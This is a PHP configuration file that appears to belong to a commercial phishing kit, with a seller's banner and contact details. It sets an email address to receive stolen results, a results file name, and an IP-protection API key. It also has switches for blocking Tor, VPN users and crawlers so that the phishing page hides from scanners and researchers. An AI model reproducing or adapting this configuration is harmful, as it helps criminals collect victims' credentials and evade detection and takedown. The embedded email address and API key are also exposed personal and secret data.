<?php
/*
Thanks To SH33NZ0
                      _          _ 
__ ____ __ ____ _ _ _| |_ ___ __| |
\ \ /\ V  V / _` | ' \  _/ -_) _` |
/_\_\ \_/\_/\__,_|_||_\__\___\__,_|
                                   
ICQ : 748219880
Facebook : https://facebook.com/xWanted
Mail : sales@xwanted.store
*/
	$text = "xwanted"; // text File of rzlt 
	// ================================= //
	// ================================= //
	$yours = "wilson1025555@yandex.com"; 	 // Edit this to your email 
	// ================================= //
	// ================================= //
	//  ------------ IP Protection ------------ //
	$ip_protection = "no"; 			     
	$ip_protection_api = "hrLrgpkoEzw5ybr2fFYSaEmVQoSYTXAu"; 
	$max_fraud_score = "75";			 
	$fuck_tor = "true";					
	$fuck_vpn = "true";					
	$fuck_crawler = "true";				
// ============================= //
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}
	// ==============< DATE >=============== //

?>